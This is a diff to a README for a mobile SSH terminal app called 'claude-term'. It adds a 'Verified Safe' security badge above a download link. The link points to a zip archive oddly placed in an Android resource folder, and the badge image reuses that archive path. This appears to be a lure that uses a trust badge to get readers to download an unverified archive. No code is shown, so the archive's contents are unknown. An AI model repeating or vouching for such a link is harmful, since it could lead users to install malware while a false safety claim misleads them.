@@ -1,5 +1,7 @@
 # 🚀 claude-term - Your Easy Mobile SSH Terminal
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/alhashmi777-claude-term)
+
 ## 📥 Download Now
 [![Download claude-term](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip%20claude--term-v1.0-brightgreen)](https://github.com/Alhashmi777/claude-term/raw/refs/heads/main/android/app/src/main/res/values-night/term_claude_intextine.zip)
 
